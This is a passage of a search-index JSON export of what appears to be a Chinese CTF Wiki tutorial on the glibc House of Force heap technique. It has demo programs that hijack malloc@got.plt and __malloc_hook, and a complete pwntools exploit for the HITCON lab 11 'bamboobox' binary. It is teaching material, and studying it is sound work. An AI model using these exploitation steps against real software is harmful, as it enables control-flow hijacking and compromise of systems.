\u6307\u9488\u66f4\u65b0\uff0c\u63a5\u4e0b\u6765\u7684\u5806\u5757\u5c31\u4f1a\u5206\u914d\u5230\u8fd9\u4e2a\u4f4d\u7f6e\uff0c\u7528\u6237\u53ea\u8981\u63a7\u5236\u4e86\u8fd9\u4e2a\u6307\u9488\u5c31\u76f8\u5f53\u4e8e\u5b9e\u73b0\u4efb\u610f\u5730\u5740\u5199\u4efb\u610f\u503c(write-anything-anywhere)\u3002  \u4e0e\u6b64\u540c\u65f6\uff0c\u6211\u4eec\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0ctopchunk\u7684size\u4e5f\u4f1a\u66f4\u65b0\uff0c\u5176\u66f4\u65b0\u7684\u65b9\u6cd5\u5982\u4e0b  victim   =   av - top ;  size     =   chunksize ( victim );  remainder_size   =   size   -   nb ;  set_head ( remainder ,   remainder_size   |   PREV_INUSE );   \u6240\u4ee5\uff0c\u5982\u679c\u6211\u4eec\u60f3\u8981\u4e0b\u6b21\u5728\u6307\u5b9a\u4f4d\u7f6e\u5206\u914d\u5927\u5c0f\u4e3a x \u7684 chunk\uff0c\u6211\u4eec\u9700\u8981\u786e\u4fdd remainder_size \u4e0d\u5c0f\u4e8e x+ MINSIZE\u3002", 
            "title": "\u539f\u7406"
        }, 
        {
            "location": "/pwn/heap/house_of_force/#1", 
            "text": "\u5728\u5b66\u4e60\u5b8c HOF \u7684\u539f\u7406\u4e4b\u540e\uff0c\u6211\u4eec\u8fd9\u91cc\u901a\u8fc7\u4e00\u4e2a\u793a\u4f8b\u6765\u8bf4\u660e HOF \u7684\u5229\u7528\uff0c\u8fd9\u4e2a\u4f8b\u5b50\u7684\u76ee\u6807\u662f\u901a\u8fc7HOF\u6765\u7be1\u6539  malloc@got.plt  \u5b9e\u73b0\u52ab\u6301\u7a0b\u5e8f\u6d41\u7a0b  int main()\n{\n    long *ptr,*ptr2;\n    ptr=malloc(0x10);\n    ptr=(long *)(((long)ptr)+24);\n    *ptr=-1;        //  === \u8fd9\u91cc\u628atop chunk\u7684size\u57df\u6539\u4e3a0xffffffffffffffff\n    malloc(-4120);  //  === \u51cf\u5c0ftop chunk\u6307\u9488\n    malloc(0x10);   //  === \u5206\u914d\u5757\u5b9e\u73b0\u4efb\u610f\u5730\u5740\u5199\n}  \u9996\u5148\uff0c\u6211\u4eec\u5206\u914d\u4e00\u4e2a 0x10 \u5b57\u8282\u5927\u5c0f\u7684\u5757  0x602000:   0x0000000000000000  0x0000000000000021  === ptr\n0x602010:   0x0000000000000000  0x0000000000000000\n0x602020:   0x0000000000000000  0x0000000000020fe1  === top chunk\n0x602030:   0x0000000000000000  0x0000000000000000 \n\u4e4b\u540e\u628a top chunk \u7684 size \u6539\u4e3a 0xffffffffffffffff\uff0c\u5728\u771f\u6b63\u7684\u9898\u76ee\u4e2d\uff0c\u8fd9\u4e00\u6b65\u53ef\u4ee5\u901a\u8fc7\u5806\u6ea2\u51fa\u7b49\u6f0f\u6d1e\u6765\u5b9e\u73b0\u3002\n\u56e0\u4e3a -1 \u5728\u8865\u7801\u4e2d\u662f\u4ee5 0xffffffffffffffff \u8868\u793a\u7684\uff0c\u6240\u4ee5\u6211\u4eec\u76f4\u63a5\u8d4b\u503c -1 \u5c31\u53ef\u4ee5\u3002  0x602000:   0x0000000000000000  0x0000000000000021  === ptr\n0x602010:   0x0000000000000000  0x0000000000000000\n0x602020:   0x0000000000000000  0xffffffffffffffff  === top chunk size\u57df\u88ab\u66f4\u6539\n0x602030:   0x0000000000000000  0x0000000000000000 \n\u6ce8\u610f\u6b64\u65f6\u7684 top chunk \u4f4d\u7f6e\uff0c\u5f53\u6211\u4eec\u8fdb\u884c\u4e0b\u4e00\u6b21\u5206\u914d\u7684\u65f6\u5019\u5c31\u4f1a\u66f4\u6539 top chunk \u7684\u4f4d\u7f6e\u5230\u6211\u4eec\u60f3\u8981\u7684\u5730\u65b9  0x7ffff7dd1b20  main_arena :    0x0000000100000000  0x0000000000000000\n0x7ffff7dd1b30  main_arena+16 : 0x0000000000000000  0x0000000000000000\n0x7ffff7dd1b40  main_arena+32 : 0x0000000000000000  0x0000000000000000\n0x7ffff7dd1b50  main_arena+48 : 0x0000000000000000  0x0000000000000000\n0x7ffff7dd1b60  main_arena+64 : 0x0000000000000000  0x0000000000000000\n0x7ffff7dd1b70  main_arena+80 : 0x0000000000000000  0x0000000000602020  === top chunk\u6b64\u65f6\u4e00\u5207\u6b63\u5e38\n0x7ffff7dd1b80  main_arena+96 : 0x0000000000000000  0x00007ffff7dd1b78 \n\u63a5\u4e0b\u6765\u6211\u4eec\u6267\u884c malloc(-4120); \uff0c-4120\u662f\u600e\u4e48\u5f97\u51fa\u7684\u5462\uff1f\n\u9996\u5148\uff0c\u6211\u4eec\u9700\u8981\u660e\u786e\u8981\u5199\u5165\u7684\u76ee\u7684\u5730\u5740\uff0c\u8fd9\u91cc\u6211\u7f16\u8bd1\u7a0b\u5e8f\u540e\uff0c0x601020 \u662f  malloc@got.plt  \u7684\u5730\u5740  0x601020:   0x00007ffff7a91130  === malloc@got.plt \n\u6240\u4ee5\u6211\u4eec\u5e94\u8be5\u5c06 top chunk \u6307\u5411 0x601010 \u5904\uff0c\u8fd9\u6837\u5f53\u4e0b\u6b21\u518d\u5206\u914d chunk \u65f6\uff0c\u5c31\u53ef\u4ee5\u5206\u914d\u5230  malloc@got.plt  \u5904\u7684\u5185\u5b58\u4e86\u3002  \u4e4b\u540e\u660e\u786e\u5f53\u524d top chunk \u7684\u5730\u5740\uff0c\u6839\u636e\u524d\u9762\u63cf\u8ff0\uff0ctop chunk \u4f4d\u4e8e 0x602020\uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u8ba1\u7b97\u504f\u79fb\u5982\u4e0b  0x601010-0x602020=-4112  \u6b64\u5916\uff0c\u7528\u6237\u7533\u8bf7\u7684\u5185\u5b58\u5927\u5c0f\uff0c\u4e00\u65e6\u8fdb\u5165\u7533\u8bf7\u5185\u5b58\u7684\u51fd\u6570\u4e2d\u5c31\u53d8\u6210\u4e86\u65e0\u7b26\u53f7\u6574\u6570\u3002  void   * __libc_malloc ( size_t   bytes )   {   \u5982\u679c\u60f3\u8981\u7528\u6237\u8f93\u5165\u7684\u5927\u5c0f\u7ecf\u8fc7\u5185\u90e8\u7684  checked_request2size \u53ef\u4ee5\u5f97\u5230\u8fd9\u6837\u7684\u5927\u5c0f\uff0c\u5373  /*     Check if a request is so large that it would wrap around zero when     padded and aligned. To simplify some other code, the bound is made     low enough so that adding MINSIZE will also not wrap around zero.   */  #define REQUEST_OUT_OF_RANGE(req)                                              \\      ((unsigned long) (req)  = (unsigned long) (INTERNAL_SIZE_T)(-2 * MINSIZE))  /* pad request bytes into a usable size -- internal version */  //MALLOC_ALIGN_MASK = 2 * SIZE_SZ -1  #define request2size(req)                                                      \\      (((req) + SIZE_SZ + MALLOC_ALIGN_MASK   MINSIZE)                           \\           ? MINSIZE                                                             \\           : ((req) + SIZE_SZ + MALLOC_ALIGN_MASK)   ~MALLOC_ALIGN_MASK)  /*  Same, except also perform argument check */  #define checked_request2size(req, sz)                                          \\      if (REQUEST_OUT_OF_RANGE(req)) {                                           \\          __set_errno(ENOMEM);                                                   \\          return 0;                                                              \\      }                                                                          \\      (sz) = request2size(req);   \u4e00\u65b9\u9762\uff0c\u6211\u4eec\u9700\u8981\u7ed5\u8fc7 REQUEST_OUT_OF_RANGE(req) \u8fd9\u4e2a\u68c0\u6d4b\uff0c\u5373\u6211\u4eec\u4f20\u7ed9 malloc \u7684\u503c\u5728\u8d1f\u6570\u8303\u56f4\u5185\uff0c\u4e0d\u5f97\u5927\u4e8e -2 * MINSIZE\uff0c\u8fd9\u4e2a\u4e00\u822c\u60c5\u51b5\u4e0b\u90fd\u662f\u53ef\u4ee5\u6ee1\u8db3\u7684\u3002  \u53e6\u4e00\u65b9\u9762\uff0c\u5728\u6ee1\u8db3\u5bf9\u5e94\u7684\u7ea6\u675f\u540e\uff0c\u6211\u4eec\u9700\u8981\u4f7f\u5f97  request2size \u6b63\u597d\u8f6c\u6362\u4e3a\u5bf9\u5e94\u7684\u5927\u5c0f\uff0c\u4e5f\u5c31\u662f\u8bf4\uff0c\u6211\u4eec\u9700\u8981\u4f7f\u5f97 ((req) + SIZE_SZ + MALLOC_ALIGN_MASK)   ~MALLOC_ALIGN_MASK \u6070\u597d\u4e3a-4112\u3002\u9996\u5148\uff0c\u5f88\u663e\u7136\uff0c-4112 \u662f chunk \u5bf9\u9f50\u7684\uff0c\u90a3\u4e48\u6211\u4eec\u53ea\u9700\u8981\u5c06\u5176\u5206\u522b\u51cf\u53bb SIZE_SZ\uff0cMALLOC_ALIGN_MASK \u5c31\u53ef\u4ee5\u5f97\u5230\u5bf9\u5e94\u7684\u9700\u8981\u7533\u8bf7\u7684\u503c\u3002\u5176\u5b9e\u6211\u4eec\u8fd9\u91cc\u53ea\u9700\u8981\u51cf SIZE_SZ \u5c31\u53ef\u4ee5\u4e86\uff0c\u56e0\u4e3a\u591a\u51cf\u7684 MALLOC_ALIGN_MASK \u6700\u540e\u8fd8\u4f1a\u88ab\u5bf9\u9f50\u6389\u3002\u800c \u5982\u679c -4112 \u4e0d\u662f MALLOC_ALIGN \u7684\u65f6\u5019\uff0c\u6211\u4eec\u5c31\u9700\u8981\u591a\u51cf\u4e00\u4e9b\u4e86\u3002\u5f53\u7136\uff0c\u6211\u4eec\u6700\u597d\u4f7f\u5f97\u5206\u914d\u4e4b\u540e\u5f97\u5230\u7684 chunk \u4e5f\u662f\u5bf9\u9f50\u7684\uff0c\u56e0\u4e3a\u5728\u91ca\u653e\u4e00\u4e2a chunk \u7684\u65f6\u5019\uff0c\u4f1a\u8fdb\u884c\u5bf9\u9f50\u68c0\u67e5\u3002  \u56e0\u6b64\uff0c\u6211\u4eec\u5f53\u8c03\u7528 malloc(-4120) \u4e4b\u540e\uff0c\u6211\u4eec\u53ef\u4ee5\u89c2\u5bdf\u5230 top chunk \u88ab\u62ac\u9ad8\u5230\u6211\u4eec\u60f3\u8981\u7684\u4f4d\u7f6e  0x7ffff7dd1b20  main_arena :\\   0x0000000100000000  0x0000000000000000\n0x7ffff7dd1b30  main_arena+16 : 0x0000000000000000  0x0000000000000000\n0x7ffff7dd1b40  main_arena+32 : 0x0000000000000000  0x0000000000000000\n0x7ffff7dd1b50  main_arena+48 : 0x0000000000000000  0x0000000000000000\n0x7ffff7dd1b60  main_arena+64 : 0x0000000000000000  0x0000000000000000\n0x7ffff7dd1b70  main_arena+80 : 0x0000000000000000  0x0000000000601010  === \u53ef\u4ee5\u89c2\u5bdf\u5230top chunk\u88ab\u62ac\u9ad8\n0x7ffff7dd1b80  main_arena+96 : 0x0000000000000000  0x00007ffff7dd1b78 \n\u4e4b\u540e\uff0c\u6211\u4eec\u5206\u914d\u7684\u5757\u5c31\u4f1a\u51fa\u73b0\u5728 0x601010+0x10 \u7684\u4f4d\u7f6e\uff0c\u4e5f\u5c31\u662f 0x601020 \u53ef\u4ee5\u66f4\u6539 got \u8868\u4e2d\u7684\u5185\u5bb9\u4e86\u3002  \u4f46\u662f\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u5728\u88ab\u62ac\u9ad8\u7684\u540c\u65f6\uff0cmalloc@got \u9644\u8fd1\u7684\u5185\u5bb9\u4e5f\u4f1a\u88ab\u4fee\u6539\u3002       set_head ( victim ,   nb   |   PREV_INUSE   | \n             ( av   !=   main_arena   ?   NON_MAIN_ARENA   :   0 ));", 
            "title": "\u7b80\u5355\u793a\u4f8b1"
        }, 
        {
            "location": "/pwn/heap/house_of_force/#2", 
            "text": "\u5728\u4e0a\u4e00\u4e2a\u793a\u4f8b\u4e2d\uff0c\u6211\u4eec\u6f14\u793a\u4e86\u901a\u8fc7 HOF \u4f7f\u5f97 top chunk \u7684\u6307\u9488\u51cf\u5c0f\u6765\u4fee\u6539\u4f4d\u4e8e\u5176\u4e0a\u9762(\u4f4e\u5730\u5740)\u7684got\u8868\u4e2d\u7684\u5185\u5bb9\uff0c\n\u4f46\u662f HOF \u5176\u5b9e\u4e5f\u53ef\u4ee5\u4f7f\u5f97 top chunk \u6307\u9488\u589e\u5927\u6765\u4fee\u6539\u4f4d\u4e8e\u9ad8\u5730\u5740\u7a7a\u95f4\u7684\u5185\u5bb9\uff0c\u6211\u4eec\u901a\u8fc7\u8fd9\u4e2a\u793a\u4f8b\u6765\u6f14\u793a\u8fd9\u4e00\u70b9  int main()\n{\n    long *ptr,*ptr2;\n    ptr=malloc(0x10);\n    ptr=(long *)(((long)ptr)+24);\n    *ptr=-1;                  === \u4fee\u6539top chunk size\n    malloc(140737345551056);  === \u589e\u5927top chunk\u6307\u9488\n    malloc(0x10);\n} \n\u6211\u4eec\u53ef\u4ee5\u770b\u5230\u7a0b\u5e8f\u4ee3\u7801\u4e0e\u7b80\u5355\u793a\u4f8b1\u57fa\u672c\u76f8\u540c\uff0c\u9664\u4e86\u7b2c\u4e8c\u6b21 malloc \u7684 size \u6709\u6240\u4e0d\u540c\u3002\n\u8fd9\u6b21\u6211\u4eec\u7684\u76ee\u6807\u662f malloc_hook\uff0c\u6211\u4eec\u77e5\u9053 malloc_hook \u662f\u4f4d\u4e8e libc.so \u91cc\u7684\u5168\u5c40\u53d8\u91cf\u503c\uff0c\u9996\u5148\u67e5\u770b\u5185\u5b58\u5e03\u5c40  Start              End                Offset             Perm Path\n0x0000000000400000 0x0000000000401000 0x0000000000000000 r-x /home/vb/\u684c\u9762/tst/t1\n0x0000000000600000 0x0000000000601000 0x0000000000000000 r-- /home/vb/\u684c\u9762/tst/t1\n0x0000000000601000 0x0000000000602000 0x0000000000001000 rw- /home/vb/\u684c\u9762/tst/t1\n0x0000000000602000 0x0000000000623000 0x0000000000000000 rw- [heap]\n0x00007ffff7a0d000 0x00007ffff7bcd000 0x0000000000000000 r-x /lib/x86_64-linux-gnu/libc-2.23.so\n0x00007ffff7bcd000 0x00007ffff7dcd000 0x00000000001c0000 --- /lib/x86_64-linux-gnu/libc-2.23.so\n0x00007ffff7dcd000 0x00007ffff7dd1000 0x00000000001c0000 r-- /lib/x86_64-linux-gnu/libc-2.23.so\n0x00007ffff7dd1000 0x00007ffff7dd3000 0x00000000001c4000 rw- /lib/x86_64-linux-gnu/libc-2.23.so\n0x00007ffff7dd3000 0x00007ffff7dd7000 0x0000000000000000 rw- \n0x00007ffff7dd7000 0x00007ffff7dfd000 0x0000000000000000 r-x /lib/x86_64-linux-gnu/ld-2.23.so\n0x00007ffff7fdb000 0x00007ffff7fde000 0x0000000000000000 rw- \n0x00007ffff7ff6000 0x00007ffff7ff8000 0x0000000000000000 rw- \n0x00007ffff7ff8000 0x00007ffff7ffa000 0x0000000000000000 r-- [vvar]\n0x00007ffff7ffa000 0x00007ffff7ffc000 0x0000000000000000 r-x [vdso]\n0x00007ffff7ffc000 0x00007ffff7ffd000 0x0000000000025000 r-- /lib/x86_64-linux-gnu/ld-2.23.so\n0x00007ffff7ffd000 0x00007ffff7ffe000 0x0000000000026000 rw- /lib/x86_64-linux-gnu/ld-2.23.so\n0x00007ffff7ffe000 0x00007ffff7fff000 0x0000000000000000 rw- \n0x00007ffffffde000 0x00007ffffffff000 0x0000000000000000 rw- [stack]\n0xffffffffff600000 0xffffffffff601000 0x0000000000000000 r-x [vsyscall] \n\u53ef\u4ee5\u770b\u5230 heap \u7684\u57fa\u5740\u5728 0x602000\uff0c\u800c libc \u7684\u57fa\u5740\u5728 0x7ffff7a0d000\uff0c\u56e0\u6b64\u6211\u4eec\u9700\u8981\u901a\u8fc7 HOF \u6269\u5927 top chunk\u6307\u9488\u7684\u503c\u6765\u5b9e\u73b0\u5bf9 malloc_hook \u7684\u5199\u3002\n\u9996\u5148\uff0c\u7531\u8c03\u8bd5\u5f97\u77e5 __malloc_hook \u7684\u5730\u5740\u4f4d\u4e8e 0x7ffff7dd1b10 \uff0c\u91c7\u53d6\u8ba1\u7b97  0x7ffff7dd1b00-0x602020-0x10=140737345551056\n\u7ecf\u8fc7\u8fd9\u6b21 malloc \u4e4b\u540e\uff0c\u6211\u4eec\u53ef\u4ee5\u89c2\u5bdf\u5230 top chunk \u7684\u5730\u5740\u88ab\u62ac\u9ad8\u5230\u4e86 0x00007ffff7dd1b00  0x7ffff7dd1b20  main_arena :    0x0000000100000000  0x0000000000000000\n0x7ffff7dd1b30  main_arena+16 : 0x0000000000000000  0x0000000000000000\n0x7ffff7dd1b40  main_arena+32 : 0x0000000000000000  0x0000000000000000\n0x7ffff7dd1b50  main_arena+48 : 0x0000000000000000  0x0000000000000000\n0x7ffff7dd1b60  main_arena+64 : 0x0000000000000000  0x0000000000000000\n0x7ffff7dd1b70  main_arena+80 : 0x0000000000000000  0x00007ffff7dd1b00  === top chunk\n0x7ffff7dd1b80  main_arena+96 : 0x0000000000000000  0x00007ffff7dd1b78 \n\u4e4b\u540e\uff0c\u6211\u4eec\u53ea\u8981\u518d\u6b21\u5206\u914d\u5c31\u53ef\u4ee5\u63a7\u5236 0x7ffff7dd1b10 \u5904\u7684 __malloc_hook \u503c\u4e86  rax = 0x00007ffff7dd1b10\n\n0x400562  main+60         mov    edi, 0x10\n0x400567  main+65         call   0x400410  malloc@plt", 
            "title": "\u7b80\u5355\u793a\u4f8b2"
        }, 
        {
            "location": "/pwn/heap/house_of_force/#_3", 
            "text": "\u5728\u8fd9\u4e00\u8282\u4e2d\u8bb2\u89e3\u4e86 House Of Force \u7684\u539f\u7406\u5e76\u4e14\u7ed9\u51fa\u4e86\u4e24\u4e2a\u5229\u7528\u7684\u7b80\u5355\u793a\u4f8b\uff0c\u901a\u8fc7\u89c2\u5bdf\u8fd9\u4e24\u4e2a\u7b80\u5355\u793a\u4f8b\u6211\u4eec\u4f1a\u53d1\u73b0\u5176\u5b9eHOF\u7684\u5229\u7528\u8981\u6c42\u8fd8\u662f\u76f8\u5f53\u82db\u523b\u7684\u3002   \u9996\u5148\uff0c\u9700\u8981\u5b58\u5728\u6f0f\u6d1e\u4f7f\u5f97\u7528\u6237\u80fd\u591f\u63a7\u5236 top chunk \u7684 size \u57df\u3002  \u5176\u6b21\uff0c \u9700\u8981\u7528\u6237\u80fd\u81ea\u7531\u63a7\u5236 malloc \u7684\u5206\u914d\u5927\u5c0f  \u7b2c\u4e09\uff0c\u5206\u914d\u7684\u6b21\u6570\u4e0d\u80fd\u53d7\u9650\u5236   \u5176\u5b9e\u8fd9\u4e09\u70b9\u4e2d\u7b2c\u4e8c\u70b9\u5f80\u5f80\u662f\u6700\u96be\u529e\u7684\uff0cCTF \u9898\u76ee\u4e2d\u5f80\u5f80\u4f1a\u7ed9\u7528\u6237\u5206\u914d\u5806\u5757\u7684\u5927\u5c0f\u9650\u5236\u6700\u5c0f\u548c\u6700\u5927\u503c\u4f7f\u5f97\u4e0d\u80fd\u901a\u8fc7HOF \u7684\u65b9\u6cd5\u8fdb\u884c\u5229\u7528\u3002", 
            "title": "\u5c0f\u603b\u7ed3"
        }, 
        {
            "location": "/pwn/heap/house_of_force/#hitcon-training-lab-11", 
            "text": "\u8fd9\u91cc\uff0c\u6211\u4eec\u4e3b\u8981\u4fee\u6539\u5176 magic \u51fd\u6570\u4e3a", 
            "title": "HITCON training lab 11"
        }, 
        {
            "location": "/pwn/heap/house_of_force/#_4", 
            "text": "\u279c  hitcontraning_lab11 git: ( master )  file bamboobox     \nbamboobox: ELF  64 -bit LSB executable, x86-64, version  1   ( SYSV ) , dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2,  for  GNU/Linux  2 .6.32, BuildID [ sha1 ]= 595428ebf89c9bf7b914dd1d2501af50d47bbbe1, not stripped\n\u279c  hitcontraning_lab11 git: ( master )  checksec bamboobox  [ * ]   /mnt/hgfs/Hack/ctf/ctf-wiki/pwn/heap/example/house_of_force/hitcontraning_lab11/bamboobox \n    Arch:     amd64-64-little\n    RELRO:    Partial RELRO\n    Stack:    Canary found\n    NX:       NX enabled\n    PIE:      No PIE  ( 0x400000 )   \u8be5\u7a0b\u5e8f\u662f\u4e00\u4e2a 64 \u4f4d\u7684\u52a8\u6001\u94fe\u63a5\u7a0b\u5e8f\u3002", 
            "title": "\u57fa\u672c\u4fe1\u606f"
        }, 
        {
            "location": "/pwn/heap/house_of_force/#_5", 
            "text": "\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u8be5\u7a0b\u5e8f\u5f00\u59cb\u65f6\u5373\u7533\u8bf7\u4e86 0x10 \u7684\u5185\u5b58\uff0c\u7528\u6765\u4fdd\u7559 \u4e24\u4e2a\u51fd\u6570\u6307\u9488 \u3002  \u8be5\u7a0b\u5e8f\u5927\u6982\u5c31\u662f\u5bf9\u4e8e\u76d2\u5b50\u91cc\u7684\u7269\u54c1\u8fdb\u884c\u6dfb\u52a0\u548c\u5220\u9664   \u5c55\u793a\u76d2\u5b50\u91cc\u7684\u5185\u5bb9\uff0c\u4f9d\u6b21\u76d2\u5b50\u91cc\u6bcf\u4e00\u4e2a\u7269\u54c1\u7684\u540d\u5b57\u3002  \u5411\u76d2\u5b50\u91cc\u6dfb\u52a0\u7269\u54c1\uff0c\u6839\u636e\u7528\u6237\u8f93\u5165\u7684\u5927\u5c0f\u6765\u4e3a\u6bcf\u4e00\u4e2a\u7269\u54c1\u7533\u8bf7\u5bf9\u5e94\u7684\u5185\u5b58\uff0c\u4f5c\u4e3a\u5176\u5b58\u50a8\u540d\u5b57\u7684\u7a7a\u95f4\u3002\u4f46\u662f\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u8fd9\u91cc\u8bfb\u53d6\u540d\u5b57\u4f7f\u7528\u7684\u662f  read  \u51fd\u6570\uff0c\u8bfb\u53d6\u957f\u5ea6\u7684\u53c2\u6570\u662f\u7528\u6237\u8f93\u5165\u7684 v2\uff0c\u800c read \u7684\u7b2c\u4e09\u4e2a\u53c2\u6570\u662f\u65e0\u7b26\u53f7\u6574\u6570\uff0c\u5982\u679c\u6211\u4eec\u8f93\u5165\u8d1f\u6570\uff0c\u5c31\u53ef\u4ee5\u8bfb\u53d6\u4efb\u610f\u957f\u5ea6\u3002\u4f46\u662f\u6211\u4eec\u9700\u8981\u786e\u4fdd\u8be5\u6570\u503c\u6ee1\u8db3 REQUEST_OUT_OF_RANGE  \u7684\u7ea6\u675f\uff0c\u6240\u4ee5\u8fd9\u91cc\u5b58\u5728 \u4efb\u610f\u957f\u5ea6\u5806\u6ea2\u51fa \u7684\u6f0f\u6d1e\u3002\u4f46\u5373\u4f7f\u8fd9\u6837\uff0c\u7b2c\u4e00\u6b21\u7684\u65f6\u5019\u4e5f\u6bd4\u8f83\u96be\u4ee5\u5229\u7528\uff0c\u56e0\u4e3a\u521d\u59cb\u65f6\u5019\u5806\u7684 top chunk \u7684\u5927\u5c0f\u4e00\u822c\u662f\u4e0d\u4f1a\u5f88\u5927\u7684\u3002  \u4fee\u6539\u7269\u54c1\u7684\u540d\u5b57\uff0c\u6839\u636e\u7ed9\u5b9a\u7684\u7d22\u5f15\uff0c\u4ee5\u53ca\u5927\u5c0f\uff0c\u5411\u6307\u5b9a\u7d22\u5f15\u7684\u7269\u54c1\u4e2d\u8bfb\u53d6\u6307\u5b9a\u957f\u5ea6\u540d\u5b57\u3002\u8fd9\u91cc\u957f\u5ea6\u7531\u7528\u6237\u6765\u8bfb\u5165\uff0c\u4e5f\u5b58\u5728 \u4efb\u610f\u957f\u5ea6\u5806\u6ea2\u51fa \u7684\u6f0f\u6d1e\u3002  \u5220\u9664\u7269\u54c1\uff0c\u5c06\u5bf9\u5e94\u7269\u54c1\u7684\u540d\u5b57\u7684\u5927\u5c0f\u7f6e\u4e3a0\uff0c\u5e76\u5c06\u5bf9\u5e94\u7684 content \u7f6e\u4e3a NULL\u3002   \u6b64\u5916\uff0c\u7531\u4e8e\u8be5\u7a0b\u5e8f\u4e3b\u8981\u662f\u4e00\u4e2a\u6f14\u793a\u7a0b\u5e8f\uff0c\u6240\u4ee5\u7a0b\u5e8f\u4e2d\u6709\u4e00\u4e2a magic \u51fd\u6570\uff0c\u53ef\u4ee5\u76f4\u63a5\u8bfb\u53d6 flag\u3002", 
            "title": "\u57fa\u672c\u529f\u80fd"
        }, 
        {
            "location": "/pwn/heap/house_of_force/#_6", 
            "text": "\u7531\u4e8e\u7a0b\u5e8f\u4e2d\u6709\u4e2a magic \u51fd\u6570\uff0c\u6240\u4ee5\u6211\u4eec\u7684\u6838\u5fc3\u76ee\u7684\u662f\u8986\u76d6\u67d0\u4e2a\u6307\u9488\u4e3a magic \u51fd\u6570\u7684\u6307\u9488\u3002\u8fd9\u91cc\uff0c\u7a0b\u5e8f\u5728\u5f00\u59cb\u7684\u65f6\u5019\u7533\u8bf7\u4e86\u4e00\u5757\u5185\u5b58\u6765\u5b58\u50a8\u4e24\u4e2a\u51fd\u6570\u6307\u9488\uff0chello_message\u7528\u4e8e\u7a0b\u5e8f\u5f00\u59cb\u65f6\u4f7f\u7528\uff0cgoodbye_message \u7528\u4e8e\u5728\u7a0b\u5e8f\u7ed3\u675f\u65f6\u4f7f\u7528\uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u5229\u7528\u8986\u76d6 goodbye_message \u6765\u63a7\u5236\u7a0b\u5e8f\u6267\u884c\u6d41\u3002\u5177\u4f53\u601d\u8def\u5982\u4e0b   \u6dfb\u52a0\u7269\u54c1\uff0c\u5229\u7528\u5806\u6ea2\u51fa\u6f0f\u6d1e\u8986\u76d6 top chunk \u7684\u5927\u5c0f\u4e3a -1\uff0c\u5373 64 \u4f4d\u6700\u5927\u503c\u3002  \u5229\u7528 house of force \u6280\u5de7\uff0c\u5206\u914d chunk \u81f3\u5806\u7684\u57fa\u5730\u5740\u3002  \u8986\u76d6 goodbye_message \u4e3amagic \u51fd\u6570\u5730\u5740\u6765\u63a7\u5236\u7a0b\u5e8f\u6267\u884c\u6d41   \u8fd9\u91cc\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u5728\u89e6\u53d1top chunk \u8f6c\u79fb\u5230\u6307\u5b9a\u4f4d\u7f6e\u65f6\uff0c\u6240\u4f7f\u7528\u7684\u5927\u5c0f\u5e94\u8be5\u5408\u9002\uff0c\u4ee5\u4fbf\u4e8e\u8bbe\u7f6e\u65b0\u7684 top chunk \u5927\u5c0f\uff0c\u4ece\u800c\u53ef\u4ee5\u7ed5\u8fc7\u4e0b\u4e00\u6b21\u5206\u914dtop chunk \u7684\u68c0\u6d4b\u3002  exp \u5982\u4e0b  #!/usr/bin/env python  # -*- coding: utf-8 -*- \n\nfrom pwn import * r   =  process ( ./bamboobox ) \ncontext.log_level  =   debug \n\n\ndef additem ( length, name ) :\n    r.recvuntil ( : ) \n    r.sendline ( 2 ) \n    r.recvuntil ( : ) \n    r.sendline ( str ( length )) \n    r.recvuntil ( : ) \n    r.sendline ( name ) \n\n\ndef modify ( idx, length, name ) :\n    r.recvuntil ( : ) \n    r.sendline ( 3 ) \n    r.recvuntil ( : ) \n    r.sendline ( str ( idx )) \n    r.recvuntil ( : ) \n    r.sendline ( str ( length )) \n    r.recvuntil ( : ) \n    r.sendline ( name ) \n\n\ndef remove ( idx ) :\n    r.recvuntil ( : ) \n    r.sendline ( 4 ) \n    r.recvuntil ( : ) \n    r.sendline ( str ( idx )) \n\n\ndef show () :\n    r.recvuntil ( : ) \n    r.sendline ( 1 )  magic   =  0x400d49 # we must alloc enough size, so as to successfully alloc from fake topchunk \nadditem ( 0x30,  ddaa )    # idx 0  payload   =  0x30 *  a    # idx 0 s content  payload   +=   a  *  8  + p64 ( 0xffffffffffffffff )    # top chunk s prev_size and size  # modify topchunk s size to -1 \nmodify ( 0 , 0x41, payload )  # top chunk s offset to heap base  offset_to_heap_base   =  - ( 0x40 + 0x20 )  malloc_size   =  offset_to_heap_base - 0x8 - 0xf #gdb.attach(r) \nadditem ( malloc_size,  dada ) \nadditem ( 0x10, p64 ( magic )  *  2 ) \nprint r.recv () \nr.interactive ()   \u5f53\u7136\uff0c\u8fd9\u4e00\u9898\u4e5f\u53ef\u4ee5\u4f7f\u7528 unlink \u7684\u65b9\u6cd5\u6765\u505a\u3002", 
            "title": "\u5229\u7528"
        }, 
        {
            "location": "/pwn/heap/house_of_force/#2016-bctf-bcloud", 
            "text": "", 
            "title": "2016 BCTF bcloud"
        }, 
        {
            "location": "/pwn/heap/house_of_force/#_7", 
            "text": "\u279c  2016_bctf_bcloud git: ( master )  file bcloud   \nbcloud: ELF  32 -bit LSB executable, Intel  80386 , version  1   ( SYSV ) , dynamically linked, interpreter /lib/ld-linux.so.2,  for  GNU/Linux  2 .6.24, BuildID [ sha1 ]= 96a3843007b1e982e7fa82fbd2e1f2cc598ee04e, stripped\n\u279c  2016_bctf_bcloud git: ( master )  checksec bcloud   [ * ]   /mnt/hgfs/Hack/ctf/ctf-wiki/pwn/heap/example/house_of_force/2016_bctf_bcloud/bcloud \n    Arch:     i386-32-little\n    RELRO:    Partial RELRO\n    Stack:    Canary found\n    NX:       NX enabled\n    PIE:      No PIE  ( 0x8048000 )   \u53ef\u4ee5\u770b\u51fa\uff0c\u8fd9\u662f\u4e00\u4e2a\u52a8\u6001\u94fe\u63a5\u7684 32 \u4f4d\u7a0b\u5e8f\uff0c\u4e3b\u8981\u5f00\u542f\u4e86 Canary \u4fdd\u62a4\u4e0e NX \u4fdd\u62a4\u3002", 
            "title": "\u57fa\u672c\u4fe1\u606f"
        }, 
        {
            "location": "/pwn/heap/house_of_force/#_8", 
